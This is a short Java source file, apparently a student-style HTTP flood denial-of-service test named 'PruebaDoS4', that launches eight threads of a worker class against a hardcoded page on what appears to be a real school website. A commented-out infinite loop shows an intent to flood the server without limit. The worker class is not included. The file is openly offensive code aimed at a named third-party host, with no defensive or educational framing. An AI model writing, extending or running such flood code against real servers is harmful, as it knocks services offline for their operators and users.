package HTTP_Flood_4;

import java.io.IOException;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PruebaDoS4 {

    public static void main(String[] args) throws IOException {
        ExecutorService pool = Executors.newFixedThreadPool(8);
        try {
            URL url = new URL("http://www.iesmachado.org/web%20insti/index_v4f.php");
            //while(true){
            for(int i=0; i<8; i++){
                pool.execute(new Hilo4(url));
            }
        } catch (Exception e) {
            System.out.println("Error al conectarse con el servidor");
            pool.shutdown();
            System.exit(0);
        }
    }
}
